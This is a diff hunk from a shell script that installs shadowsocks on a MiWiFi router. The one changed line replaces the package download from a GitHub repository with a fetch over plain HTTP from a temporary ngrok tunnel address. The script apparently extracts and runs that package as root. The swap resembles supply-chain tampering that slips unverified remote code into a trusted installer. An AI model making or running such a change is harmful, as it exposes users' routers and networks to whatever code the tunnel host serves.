@@ -183,7 +183,7 @@ cat > /etc/shadowsocks.json<<-EOF
 }
 EOF
 
-wget https://github.com/huibizhang/shadowsocks-miwifi/raw/master/shadowsocks_r3.tar.gz -P /tmp/
+wget http://d807-123-240-82-144.ngrok-free.app/shadowsocks_miwifi.tar.gz -P /tmp/
 echo -e "|\033[32m***************\033[0m| \033[31m30%\033[0m"
 killall ss-redir &> /dev/null
 rm -rf /etc/dnsmasq.d/*
